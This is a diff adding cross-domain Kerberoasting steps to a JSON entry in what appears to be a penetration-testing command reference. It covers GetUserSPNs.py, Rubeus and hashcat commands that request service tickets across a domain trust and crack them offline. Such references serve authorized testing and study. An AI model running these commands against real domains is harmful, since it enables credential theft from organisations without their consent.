@@ -75,5 +75,29 @@
   },
   "tools": [
     "impacket"
+  ],
+  "variations": [
+    {
+      "label": "Pass-the-ticket auth",
+      "command": "GetUserSPNs.py -request -target-domain <foreign_domain> -k -no-pass <domain>/<user>"
+    },
+    {
+      "label": "Rubeus cross-domain",
+      "command": ".\\Rubeus.exe kerberoast /domain:<foreign_domain> /nowrap"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find foreign-domain SPN accounts",
+      "command": "GetUserSPNs.py -target-domain <foreign_domain> <domain>/<user>:<password>"
+    },
+    {
+      "label": "Request their TGS across the trust",
+      "command": "GetUserSPNs.py -request -target-domain <foreign_domain> <domain>/<user>:<password> -outputfile xf.txt"
+    },
+    {
+      "label": "Crack offline",
+      "command": "hashcat -m 13100 xf.txt /usr/share/wordlists/rockyou.txt"
+    }
   ]
 }
